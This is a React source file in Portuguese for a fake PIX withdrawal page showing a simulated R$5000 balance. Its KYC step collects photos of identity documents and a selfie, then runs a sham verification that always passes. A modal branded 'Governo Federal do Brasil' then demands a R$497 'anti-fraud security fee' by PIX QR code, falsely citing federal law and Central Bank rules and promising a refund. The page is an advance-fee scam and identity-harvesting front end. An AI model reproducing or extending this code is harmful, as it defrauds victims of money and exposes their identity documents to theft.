"use client"

import React, { useState, useEffect, useCallback, useRef } from "react"
import { X, Copy, AlertTriangle, Shield, Camera, Upload, CheckCircle } from "lucide-react"

export default function SaquePage() {
  const [withdrawalAmount, setWithdrawalAmount] = useState("200")
  const [pixKey, setPixKey] = useState("")
  const [agreedToTerms, setAgreedToTerms] = useState(false)
  const [balance, setBalance] = useState(5000) // Simulado
  const [isLoadingBalance, setIsLoadingBalance] = useState(false)
  const [user, setUser] = useState({ id: '1' }) // Simulado

  // Estados para o popup de taxa de segurança
  const [showSecurityTaxModal, setShowSecurityTaxModal] = useState(false)
  const [taxStep, setTaxStep] = useState(1)
  const [qrCode, setQrCode] = useState<string | null>(null)
  const [pixPayload, setPixPayload] = useState<string>("")
  const [loading, setLoading] = useState(false)

  const [showKycModal, setShowKycModal] = useState(false)
  const [kycStep, setKycStep] = useState(1)
  const [documentType, setDocumentType] = useState("")
  const [documentFront, setDocumentFront] = useState<string | null>(null)
  const [documentBack, setDocumentBack] = useState<string | null>(null)
  const [selfiePhoto, setSelfiePhoto] = useState<string | null>(null)
  const [isAnalyzing, setIsAnalyzing] = useState(false)
  const [analysisComplete, setAnalysisComplete] = useState(false)
  const videoRef = useRef<HTMLVideoElement>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [isCameraActive, setIsCameraActive] = useState(false)
  const [captureMode, setCaptureMode] = useState<"front" | "back" | "selfie" | null>(null)
  const [cameraError, setCameraError] = useState<string | null>(null)
  const streamRef = useRef<MediaStream | null>(null)

  const predefinedAmounts = [200, 1000, 2000, 100, 500, 1500, 4000]

  const handleAmountSelect = (amount: number) => {
    setWithdrawalAmount(amount.toString())
  }

  const showToast = (title: string, description: string, variant: "default" | "destructive" = "default") => {
    console.log(`Toast: ${title} - ${description}`)
  }

  const handleWithdrawal = () => {
    const withdrawalValue = Number.parseFloat(withdrawalAmount)

    if (!withdrawalAmount || !pixKey || !agreedToTerms) {
      showToast("Campos obrigatórios", "Por favor, preencha todos os campos obrigatórios.", "destructive")
      return
    }

    if (withdrawalValue <= 0) {
      showToast("Valor inválido", "O valor do saque deve ser maior que zero.", "destructive")
      return
    }

    if (withdrawalValue > balance) {
      showToast("Saldo insuficiente", `Seu saldo atual é R$ ${balance.toFixed(2)}`, "destructive")
      return
    }

    if (withdrawalValue < 10) {
      showToast("Valor mínimo", "O valor mínimo para saque é R$ 10,00", "destructive")
      return
    }

    setShowKycModal(true)
    setKycStep(1)
  }

  const startCamera = async (mode: "front" | "back" | "selfie") => {
    setCaptureMode(mode)
    setCameraError(null)
    
    try {
      // Para a stream anterior se existir
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop())
      }

      const constraints = {
        video: { 
          facingMode: mode === "selfie" ? "user" : "environment",
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      }

      const stream = await navigator.mediaDevices.getUserMedia(constraints)
      streamRef.current = stream
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream
        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play().catch(error => {
            console.error("Erro ao reproduzir vídeo:", error)
            setCameraError("Erro ao iniciar preview da câmera")
          })
        }
        setIsCameraActive(true)
      }
    } catch (error) {
      console.error("Erro da câmera:", error)
      setCameraError("Não foi possível acessar a câmera. Verifique as permissões.")
      setIsCameraActive(false)
    }
  }

  const capturePhoto = () => {
    if (videoRef.current && canvasRef.current && videoRef.current.videoWidth > 0) {
      const canvas = canvasRef.current
      const video = videoRef.current
      
      canvas.width = video.videoWidth
      canvas.height = video.videoHeight
      
      const ctx = canvas.getContext("2d")
      if (ctx) {
        ctx.drawImage(video, 0, 0)
        const imageData = canvas.toDataURL("image/jpeg", 0.8)

        if (captureMode === "front") {
          setDocumentFront(imageData)
        } else if (captureMode === "back") {
          setDocumentBack(imageData)
        } else if (captureMode === "selfie") {
          setSelfiePhoto(imageData)
        }

        stopCamera()
        showToast("Foto capturada!", "Foto capturada com sucesso.")
      }
    } else {
      setCameraError("Erro ao capturar foto. Tente novamente.")
    }
  }

  const stopCamera = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop())
      streamRef.current = null
    }
    
    if (videoRef.current) {
      videoRef.current.srcObject = null
    }
    
    setIsCameraActive(false)
    setCaptureMode(null)
    setCameraError(null)
  }

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>, type: "front" | "back" | "selfie") => {
    const file = event.target.files?.[0]
    if (file) {
      if (file.size > 5 * 1024 * 1024) { // 5MB limit
        showToast("Arquivo muito grande", "O arquivo deve ter no máximo 5MB.", "destructive")
        return
      }

      const reader = new FileReader()
      reader.onload = (e) => {
        const result = e.target?.result as string
        if (type === "front") {
          setDocumentFront(result)
        } else if (type === "back") {
          setDocumentBack(result)
        } else if (type === "selfie") {
          setSelfiePhoto(result)
        }
        showToast("Arquivo enviado!", "Imagem carregada com sucesso.")
      }
      reader.onerror = () => {
        showToast("Erro ao carregar", "Não foi possível carregar a imagem.", "destructive")
      }
      reader.readAsDataURL(file)
    }
  }

  const analyzeDocuments = async () => {
    setIsAnalyzing(true)
    // Simulate analysis
    await new Promise((resolve) => setTimeout(resolve, 3000))
    setAnalysisComplete(true)
    setIsAnalyzing(false)

    showToast("Verificação concluída!", "Documentos verificados com sucesso.")

    // After KYC is complete, show security tax modal
    setTimeout(() => {
      setShowKycModal(false)
      setShowSecurityTaxModal(true)
      setTaxStep(1)
    }, 2000)
  }

  const handleSecurityTaxPayment = async () => {
    setLoading(true)
    try {
      // Simular geração de QR Code para taxa de segurança
      const mockPixCode = "00020126580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426614174000520400005303986540549700"
      const qrCodeImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(mockPixCode)}`

      setPixPayload(mockPixCode)
      setQrCode(qrCodeImageUrl)
      setTaxStep(2)
    } catch (error) {
      console.error("Erro:", error)
      showToast("Erro", "Erro ao gerar pagamento PIX", "destructive")
    } finally {
      setLoading(false)
    }
  }

  const copyPixCode = () => {
    navigator.clipboard.writeText(pixPayload)
    showToast("Código copiado!", "Código PIX copiado para a área de transferência.")
  }

  const closeSecurityTaxModal = () => {
    setShowSecurityTaxModal(false)
    setTaxStep(1)
    setQrCode(null)
    setPixPayload("")
  }

  const closeKycModal = () => {
    setShowKycModal(false)
    setKycStep(1)
    setDocumentType("")
    setDocumentFront(null)
    setDocumentBack(null)
    setSelfiePhoto(null)
    setAnalysisComplete(false)
    stopCamera()
  }

  // Cleanup ao desmontar o componente
  useEffect(() => {
    return () => {
      stopCamera()
    }
  }, [])

  const CameraPreview = ({ mode }: { mode: "front" | "back" | "selfie" }) => {
    return (
      <div className="relative bg-black rounded-lg overflow-hidden">
        {cameraError ? (
          <div className="w-full h-64 flex items-center justify-center bg-red-900/20 border border-red-500/20 rounded-lg">
            <div className="text-center">
              <AlertTriangle className="w-8 h-8 text-red-500 mx-auto mb-2" />
              <p className="text-red-400 text-sm">{cameraError}</p>
              <button
                onClick={() => startCamera(mode)}
                className="mt-2 px-4 py-2 bg-red-500 text-white rounded-lg text-sm hover:bg-red-600 transition-colors"
              >
                Tentar Novamente
              </button>
            </div>
          </div>
        ) : (
          <>
            <video 
              ref={videoRef} 
              autoPlay 
              playsInline 
              muted
              className="w-full h-64 object-cover bg-black"
              style={{ transform: mode === "selfie" ? "scaleX(-1)" : "none" }}
            />
            <canvas ref={canvasRef} className="hidden" />
            
            {/* Overlay para selfie com contorno do rosto */}
            {mode === "selfie" && (
              <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                <svg width="180" height="220" viewBox="0 0 180 220" className="opacity-80">
                  <ellipse
                    cx="90"
                    cy="110"
                    rx="70"
                    ry="85"
                    fill="none"
                    stroke="#26d47c"
                    strokeWidth="3"
                    strokeDasharray="8,4"
                  />
                  <circle cx="70" cy="90" r="3" fill="#26d47c" opacity="0.6" />
                  <circle cx="110" cy="90" r="3" fill="#26d47c" opacity="0.6" />
                  <line x1="90" y1="100" x2="90" y2="115" stroke="#26d47c" strokeWidth="2" opacity="0.6" />
                  <path
                    d="M 75 130 Q 90 140 105 130"
                    fill="none"
                    stroke="#26d47c"
                    strokeWidth="2"
                    opacity="0.6"
                  />
                </svg>
              </div>
            )}

            {/* Status indicator */}
            <div className="absolute top-2 left-2 bg-green-500 text-white px-2 py-1 rounded text-xs font-medium flex items-center gap-1">
              <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
              CÂMERA ATIVA
            </div>

            {/* Instructions overlay */}
            <div className="absolute top-2 left-1/2 transform -translate-x-1/2 bg-black bg-opacity-70 rounded-lg px-3 py-2">
              <p className="text-white text-xs text-center">
                {mode === "selfie" 
                  ? "Posicione seu rosto dentro do contorno verde"
                  : `Posicione o ${mode === "front" ? "frente" : "verso"} do documento na tela`
                }
              </p>
            </div>

            {/* Controls */}
            <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2 flex gap-3">
              <button
                onClick={capturePhoto}
                className="bg-[#26d47c] text-black px-6 py-2 rounded-full font-medium text-sm hover:bg-[#22c470] transition-colors flex items-center gap-2"
              >
                <Camera className="w-4 h-4" />
                Capturar
              </button>
              <button
                onClick={stopCamera}
                className="bg-red-500 text-white px-6 py-2 rounded-full font-medium text-sm hover:bg-red-600 transition-colors"
              >
                Cancelar
              </button>
            </div>
          </>
        )}
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#141d2f] text-white">
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6">
          <div className="text-sm text-[#848E9C] mb-2">
            <span className="hover:text-white cursor-pointer">Método de saque</span>
            <span className="mx-2">›</span>
            <span className="text-white font-medium">PIX</span>
          </div>
        </div>

        <div className="max-w-2xl mx-auto">
          <div className="bg-[#101825] rounded-lg p-6 mb-6">
            <div className="flex items-center gap-4 mb-4">
              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
                <div className="w-8 h-8 bg-[#26d47c] rounded flex items-center justify-center text-black font-bold text-xs">
                  PIX
                </div>
              </div>
              <h2 className="text-2xl font-bold text-white">PIX</h2>
            </div>

            <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 mb-6">
              <p className="text-blue-400 text-sm">
                Após a solicitação, o valor do saque será creditado em sua conta em até 72 horas.
              </p>
            </div>

            <div className="grid md:grid-cols-2 gap-6">
              {/* Valor do saque */}
              <div>
                <label className="block text-white font-medium mb-3">Valor do saque</label>
                <input
                  type="text"
                  value={`R$ ${withdrawalAmount}`}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^\d]/g, "")
                    setWithdrawalAmount(value)
                  }}
                  className="w-full p-3 bg-[#1a2332] border border-[#2B3139] rounded-lg text-white focus:border-[#26d47c] focus:outline-none"
                />

                <div className="grid grid-cols-4 gap-2 mt-3">
                  {predefinedAmounts.map((amount) => (
                    <button
                      key={amount}
                      onClick={() => handleAmountSelect(amount)}
                      className={`p-2 rounded-lg text-sm font-medium transition-colors ${
                        withdrawalAmount === amount.toString()
                          ? "bg-[#26d47c] text-black"
                          : "bg-[#2B3139] text-white hover:bg-[#434C5A]"
                      }`}
                    >
                      R$ {amount.toLocaleString()}
                    </button>
                  ))}
                </div>
              </div>

              {/* Chave PIX */}
              <div>
                <label className="block text-white font-medium mb-3">Chave PIX para receber</label>
                <input
                  type="text"
                  value={pixKey}
                  onChange={(e) => setPixKey(e.target.value)}
                  placeholder="CPF, e-mail, telefone..."
                  className="w-full p-3 bg-[#1a2332] border border-[#2B3139] rounded-lg text-white placeholder-[#848E9C] focus:border-[#26d47c] focus:outline-none"
                />
              </div>
            </div>

            <div className="mt-6">
              <label className="flex items-center gap-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={agreedToTerms}
                  onChange={(e) => setAgreedToTerms(e.target.checked)}
                  className="w-4 h-4 text-[#26d47c] bg-[#2B3139] border-[#434C5A] rounded focus:ring-[#26d47c] focus:ring-2"
                />
                <span className="text-[#848E9C] text-sm">Eu, por meio deste, aceito os Termos e Condições</span>
              </label>
            </div>

            <div className="flex gap-4 mt-6">
              <button
                onClick={() => window.history.back()}
                className="flex-1 py-3 px-6 bg-transparent border border-[#434C5A] text-white rounded-lg hover:bg-[#2B3139] transition-colors"
              >
                Voltar
              </button>
              <button
                onClick={handleWithdrawal}
                className="flex-1 py-3 px-6 bg-[#26d47c] text-black font-medium rounded-lg hover:bg-[#22c470] transition-colors"
              >
                Confirmar Saque
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* KYC Modal */}
      {showKycModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-[#101825] rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
            <div className="p-6">
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-xl font-bold text-white">Verificação de Identidade (KYC)</h2>
                <button onClick={closeKycModal} className="text-[#848E9C] hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Step 1: Document Type Selection */}
              {kycStep === 1 && (
                <div className="space-y-6">
                  <div className="text-center">
                    <Shield className="w-16 h-16 text-[#26d47c] mx-auto mb-4" />
                    <h3 className="text-lg font-bold text-white mb-2">Selecione o tipo de documento</h3>
                    <p className="text-[#848E9C] text-sm">Escolha o documento que você irá fotografar</p>
                  </div>

                  <div className="grid gap-4">
                    {["RG", "CNH", "Passaporte"].map((doc) => (
                      <button
                        key={doc}
                        onClick={() => {
                          setDocumentType(doc)
                          setKycStep(2)
                        }}
                        className="p-4 bg-[#2B3139] hover:bg-[#434C5A] rounded-lg text-white transition-colors text-left"
                      >
                        <div className="font-medium">{doc}</div>
                        <div className="text-sm text-[#848E9C] mt-1">
                          {doc === "RG" && "Registro Geral (frente e verso)"}
                          {doc === "CNH" && "Carteira Nacional de Habilitação (frente e verso)"}
                          {doc === "Passaporte" && "Passaporte (página principal)"}
                        </div>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Step 2: Document Front */}
              {kycStep === 2 && (
                <div className="space-y-6">
                  <div className="text-center">
                    <h3 className="text-lg font-bold text-white mb-2">Fotografe a frente do {documentType}</h3>
                    <p className="text-[#848E9C] text-sm">Tire uma foto clara da frente do seu documento</p>
                  </div>

                  <div className="max-w-sm mx-auto">
                    {isCameraActive && captureMode === "front" ? (
                      <CameraPreview mode="front" />
                    ) : documentFront ? (
                      <div className="space-y-3">
                        <div className="relative">
                          <img
                            src={documentFront}
                            alt="Frente do documento"
                            className="w-full h-64 object-cover rounded-lg"
                          />
                          <button
                            onClick={() => setDocumentFront(null)}
                            className="absolute top-2 right-2 bg-red-500 text-white rounded-full p-1 hover:bg-red-600 transition-colors"
                          >
                            <X className="w-4 h-4" />
                          </button>
                        </div>
                        <div className="flex gap-2">
                          <button
                            onClick={() => setDocumentFront(null)}
                            className="flex-1 py-2 px-3 bg-[#434C5A] text-white rounded-lg hover:bg-[#2B3139] transition-colors text-sm"
                          >
                            Refazer Foto
                          </button>
                          <button
                            className="flex-1 py-2 px-3 bg-[#26d47c] text-black rounded-lg hover:bg-[#22c470] transition-colors text-sm font-medium"
                            onClick={() => setKycStep(3)}
                          >
                            ✓ Continuar
                          </button>
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        <button
                          onClick={() => startCamera("front")}
                          className="w-full p-4 border-2 border-dashed border-[#434C5A] rounded-lg text-[#848E9C] hover:border-[#26d47c] hover:text-[#26d47c] transition-colors flex items-center justify-center gap-2"
                        >
                          <Camera className="w-5 h-5" />
                          Usar Câmera
                        </button>
                        <input
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleFileUpload(e, "front")}
                          className="hidden"
                          id="front-upload"
                        />
                        <label
                          htmlFor="front-upload"
                          className="w-full p-4 border-2 border-dashed border-[#434C5A] rounded-lg text-[#848E9C] hover:border-[#26d47c] hover:text-[#26d47c] transition-colors flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <Upload className="w-5 h-5" />
                          Enviar Arquivo
                        </label>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Step 3: Document Back */}
              {kycStep === 3 && (
                <div className="space-y-6">
                  <div className="text-center">
                    <h3 className="text-lg font-bold text-white mb-2">Fotografe o verso do {documentType}</h3>
                    <p className="text-[#848E9C] text-sm">Tire uma foto clara do verso do seu documento</p>
                  </div>

                  <div className="max-w-sm mx-auto">
                    {isCameraActive && captureMode === "back" ? (
                      <CameraPreview mode="back" />
                    ) : documentBack ? (
                      <div className="space-y-3">
                        <div className="relative">
                          <img
                            src={documentBack}
                            alt="Verso do documento"
                            className="w-full h-64 object-cover rounded-lg"
                          />
                          <button
                            onClick={() => setDocumentBack(null)}
                            className="absolute top-2 right-2 bg-red-500 text-white rounded-full p-1 hover:bg-red-600 transition-colors"
                          >
                            <X className="w-4 h-4" />
                          </button>
                        </div>
                        <div className="flex gap-2">
                          <button
                            onClick={() => setDocumentBack(null)}
                            className="flex-1 py-2 px-3 bg-[#434C5A] text-white rounded-lg hover:bg-[#2B3139] transition-colors text-sm"
                          >
                            Refazer Foto
                          </button>
                          <button
                            className="flex-1 py-2 px-3 bg-[#26d47c] text-black rounded-lg hover:bg-[#22c470] transition-colors text-sm font-medium"
                            onClick={() => setKycStep(4)}
                          >
                            ✓ Continuar
                          </button>
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        <button
                          onClick={() => startCamera("back")}
                          className="w-full p-4 border-2 border-dashed border-[#434C5A] rounded-lg text-[#848E9C] hover:border-[#26d47c] hover:text-[#26d47c] transition-colors flex items-center justify-center gap-2"
                        >
                          <Camera className="w-5 h-5" />
                          Usar Câmera
                        </button>
                        <input
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleFileUpload(e, "back")}
                          className="hidden"
                          id="back-upload"
                        />
                        <label
                          htmlFor="back-upload"
                          className="w-full p-4 border-2 border-dashed border-[#434C5A] rounded-lg text-[#848E9C] hover:border-[#26d47c] hover:text-[#26d47c] transition-colors flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <Upload className="w-5 h-5" />
                          Enviar Arquivo
                        </label>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Step 4: Selfie */}
              {kycStep === 4 && (
                <div className="space-y-6">
                  <div className="text-center">
                    <h3 className="text-lg font-bold text-white mb-2">Tire uma selfie</h3>
                    <p className="text-[#848E9C] text-sm">Posicione seu rosto dentro do contorno e tire a foto</p>
                  </div>

                  <div className="max-w-sm mx-auto">
                    {isCameraActive && captureMode === "selfie" ? (
                      <CameraPreview mode="selfie" />
                    ) : selfiePhoto ? (
                      <div className="space-y-3">
                        <div className="relative">
                          <img
                            src={selfiePhoto}
                            alt="Selfie"
                            className="w-full h-64 object-cover rounded-lg"
                          />
                          <button
                            onClick={() => setSelfiePhoto(null)}
                            className="absolute top-2 right-2 bg-red-500 text-white rounded-full p-1 hover:bg-red-600 transition-colors"
                          >
                            <X className="w-4 h-4" />
                          </button>
                        </div>
                        <div className="flex gap-2">
                          <button
                            onClick={() => setSelfiePhoto(null)}
                            className="flex-1 py-2 px-3 bg-[#434C5A] text-white rounded-lg hover:bg-[#2B3139] transition-colors text-sm"
                          >
                            Refazer Selfie
                          </button>
                          <button
                            className="flex-1 py-2 px-3 bg-[#26d47c] text-black rounded-lg hover:bg-[#22c470] transition-colors text-sm font-medium"
                            onClick={() => setKycStep(5)}
                          >
                            ✓ Continuar
                          </button>
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        <button
                          onClick={() => startCamera("selfie")}
                          className="w-full p-4 border-2 border-dashed border-[#434C5A] rounded-lg text-[#848E9C] hover:border-[#26d47c] hover:text-[#26d47c] transition-colors flex items-center justify-center gap-2"
                        >
                          <Camera className="w-5 h-5" />
                          Usar Câmera
                        </button>
                        <input
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleFileUpload(e, "selfie")}
                          className="hidden"
                          id="selfie-upload"
                        />
                        <label
                          htmlFor="selfie-upload"
                          className="w-full p-4 border-2 border-dashed border-[#434C5A] rounded-lg text-[#848E9C] hover:border-[#26d47c] hover:text-[#26d47c] transition-colors flex items-center justify-center gap-2 cursor-pointer"
                        >
                          <Upload className="w-5 h-5" />
                          Enviar Arquivo
                        </label>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Step 5: Analysis */}
              {kycStep === 5 && (
                <div className="space-y-6 text-center">
                  {!analysisComplete ? (
                    <>
                      <div className="w-16 h-16 border-4 border-[#26d47c] border-t-transparent rounded-full animate-spin mx-auto"></div>
                      <h3 className="text-lg font-bold text-white">Analisando documentos...</h3>
                      <p className="text-[#848E9C] text-sm">Aguarde enquanto verificamos suas informações</p>
                      {!isAnalyzing && (
                        <button
                          onClick={analyzeDocuments}
                          className="py-3 px-6 bg-[#26d47c] text-black font-medium rounded-lg hover:bg-[#22c470] transition-colors"
                        >
                          Iniciar Análise
                        </button>
                      )}
                    </>
                  ) : (
                    <>
                      <CheckCircle className="w-16 h-16 text-[#26d47c] mx-auto" />
                      <h3 className="text-lg font-bold text-white">Verificação concluída!</h3>
                      <p className="text-[#848E9C] text-sm">Seus documentos foram verificados com sucesso</p>
                    </>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Security Tax Modal */}
      {showSecurityTaxModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-[#101825] rounded-lg max-w-md w-full max-h-[90vh] overflow-y-auto">
            <div className="p-6">
              {/* Header do modal */}
              <div className="flex items-center justify-between mb-6">
                <button onClick={closeSecurityTaxModal} className="text-[#848E9C] hover:text-white">
                  <X className="w-5 h-5" />
                </button>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-green-600 rounded flex items-center justify-center text-white font-bold text-xs">
                    BR
                  </div>
                </div>
                <div></div>
              </div>

              <div className="text-center mb-6">
                <h3 className="text-lg font-bold text-white">Governo Federal do Brasil</h3>
              </div>

              {/* Indicador de steps */}
              <div className="flex items-center justify-center mb-6">
                <div
                  className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                    taxStep === 1 ? "bg-[#26d47c] text-black" : "bg-[#434C5A] text-white"
                  }`}
                >
                  1
                </div>
                <div className="w-12 h-0.5 bg-[#434C5A] mx-2"></div>
                <div
                  className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                    taxStep === 2 ? "bg-[#26d47c] text-black" : "bg-[#434C5A] text-white"
                  }`}
                >
                  2
                </div>
              </div>

              {/* Tela 1 - Explicação da taxa */}
              {taxStep === 1 && (
                <div className="space-y-6">
                  <div className="text-center">
                    <div className="w-16 h-16 bg-yellow-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                      <AlertTriangle className="w-8 h-8 text-yellow-500" />
                    </div>
                    <h2 className="text-xl font-bold text-white mb-2">Taxa de Segurança Anti-Fraude</h2>
                  </div>

                  <div className="bg-[#2B3139] rounded-lg p-4 text-center">
                    <div className="text-[#848E9C] text-sm mb-1">Taxa Obrigatória</div>
                    <div className="text-2xl font-bold text-[#26d47c]">R$ 497,00</div>
                  </div>

                  <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
                    <h3 className="text-green-400 font-bold mb-2 flex items-center gap-2">
                      <Shield className="w-4 h-4" />
                      Lei Federal Anti-Fraude
                    </h3>
                    <p className="text-green-400 text-sm mb-2">
                      Esta cobrança está prevista na <strong>Lei Federal nº 14.063/2020</strong> e é obrigatória para
                      validação de saques elevados.
                    </p>
                    <p className="text-green-400 text-sm mb-2">
                      <strong>Finalidade:</strong> Proteger sua conta contra fraudes e validar a legitimidade da
                      operação financeira.
                    </p>
                    <p className="text-green-400 text-sm">
                      <strong>⚠️ IMPORTANTE:</strong> O valor da taxa será depositado em sua conta junto com o valor do
                      saque após a validação.
                    </p>
                  </div>

                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4">
                    <h3 className="text-yellow-400 font-bold mb-2">⚖️ Respaldo Jurídico</h3>
                    <p className="text-yellow-400 text-sm mb-2">
                      Esta cobrança está prevista na <strong>Lei Federal de Combate à Lavagem de Dinheiro</strong> e é
                      aplicada automaticamente pelo Sistema Financeiro Nacional.
                    </p>
                    <p className="text-yellow-400 text-sm">
                      Aplicável para operações acima de <strong>R$ 10.000,00</strong> conforme normativa do Banco
                      Central.
                    </p>
                  </div>

                  <button
                    onClick={handleSecurityTaxPayment}
                    disabled={loading}
                    className="w-full py-3 rounded-lg font-medium bg-[#26d47c] hover:bg-[#22c470] text-black transition-colors disabled:opacity-50"
                  >
                    {loading ? "Gerando PIX..." : "Prosseguir com o Pagamento"}
                  </button>
                </div>
              )}

              {/* Tela 2 - QR Code para pagamento */}
              {taxStep === 2 && (
                <div className="space-y-6">
                  <div className="text-center">
                    <h2 className="text-xl font-bold text-white mb-2">Pagamento da Taxa de Segurança</h2>
                  </div>

                  {qrCode && (
                    <div className="bg-white rounded-lg p-4 text-center">
                      <img src={qrCode} alt="QR Code PIX" className="mx-auto mb-2" />
                      <p className="text-gray-600 text-sm">Escaneie com o app do seu banco</p>
                    </div>
                  )}

                  <div className="bg-[#2B3139] rounded-lg p-4">
                    <h3 className="text-white font-bold mb-3 flex items-center gap-2">📱 PIX Copia e Cola</h3>
                    <textarea
                      value={pixPayload}
                      readOnly
                      className="w-full h-20 p-2 bg-[#1a2332] border border-[#434C5A] rounded text-white text-xs resize-none"
                    />
                    <button
                      onClick={copyPixCode}
                      className="w-full mt-3 py-2 bg-[#26d47c] text-black font-medium rounded-lg hover:bg-[#22c470] transition-colors flex items-center justify-center gap-2"
                    >
                      <Copy className="w-4 h-4" />
                      📋 Copiar código PIX
                    </button>
                  </div>

                  <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                    <h3 className="text-blue-400 font-bold mb-3">⏰ Instruções Importantes</h3>
                    <div className="space-y-2 text-blue-400 text-sm">
                      <div className="flex items-center gap-2">
                        <div className="w-1.5 h-1.5 bg-blue-400 rounded-full"></div>
                        <span>Pague em até 30 minutos</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <div className="w-1.5 h-1.5 bg-blue-400 rounded-full"></div>
                        <span>Validação em até 24h úteis</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <div className="w-1.5 h-1.5 bg-blue-400 rounded-full"></div>
                        <span>Valor do saque + taxa após validação</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <div className="w-1.5 h-1.5 bg-blue-400 rounded-full"></div>
                        <span>Guarde o comprovante</span>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}